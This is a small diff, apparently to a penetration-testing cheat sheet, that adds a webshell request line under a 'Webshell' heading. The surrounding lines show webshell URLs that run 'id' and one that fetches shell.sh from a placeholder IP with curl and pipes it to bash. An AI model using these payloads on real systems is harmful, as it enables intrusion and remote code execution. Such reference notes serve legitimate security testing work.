@@ -1031,6 +1031,7 @@ http://<IP address>/data/2
 - Webshell
 
 ```
+http://<domain name>/shell.php&cmd=id
 http://<domain name>/shell.php?cmd=id
 http://<domain name>/shell.php?cmd=curl%20<IP address>:8000/shell.sh|bash
 ```
